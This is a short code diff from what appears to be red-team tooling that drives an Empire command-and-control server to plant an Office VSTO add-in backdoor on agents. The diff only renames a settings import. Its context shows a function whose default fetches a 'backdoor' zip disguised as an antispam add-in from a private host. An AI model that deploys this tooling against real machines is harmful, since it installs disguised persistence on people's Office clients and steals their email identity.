@@ -8,7 +8,7 @@ Returns email address when successful.
 ENSURE vsto_reg_add is UPDATED if new VSTO add-in is compiled
 """
 from EmpireAPIWrapper import empireAPI
-from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
+from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
 
 def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antispam.zip'):
     """
